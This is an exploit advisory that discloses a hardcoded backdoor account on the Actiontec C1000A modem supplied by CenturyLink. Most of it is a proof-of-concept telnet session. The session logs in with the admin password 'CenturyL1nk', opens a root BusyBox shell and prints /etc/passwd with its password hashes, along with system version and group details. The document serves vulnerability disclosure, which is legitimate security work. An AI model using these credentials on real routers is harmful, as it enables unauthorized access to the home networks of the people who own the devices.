# Exploit Title: Actiontec C1000A backdoor account
# Google Dork: NA
# Date: 11/04/2017
# Exploit Author: Joseph McDonagh
# Vendor Homepage: https://actiontecsupport.zendesk.com/hc/en-us
# Software Link: N/A Hardware
# Version: Firmware CAC003-31.30L.86
# Tested on: Linux
# CVE : NA

# The Actiontec C1000A Modem provided by CenturyLink has hardcoded passwords. This is similar to another recent submission by Matthew Shiemo, who inspired me to check the device I use.

# Proof of Concept

$ telnet 192.168.0.1
===Actiontec xDSL Router===
Login: admin
Password: CenturyL1nk
 > sh
 
 BusyBox v1.17.2 (2015-10-30 10:34:29 CST built-in shell (ash)
 Enter 'help' for a list of build-in commands
 
 # cat /etc/passwd
 admin:Rtqa.nQhYPBRo:0:0:Administratir:/:/bin/sh
 support:vmiTSa8ukDkOY:0:0:Technical Support:/:/bin/sh
 user:Fq10qi6QmLmmY:0:0:Normal User:/:/bin/sh
 nobody:rZy3YulyLvuYU:0:0:nobody for ftp:/bin/sh
 # cat /proc/version
 Linux version 2.6.30 (waye@hugh-PowerEdge-R220.home) (gcc version 4.4.2 (Buildroot 2010.02-git) ) #1 SMP PREEMPT Fri Oct 30 12:32:15 CST 2015
 # cat /etc/group
 root::0:root,admin,support,user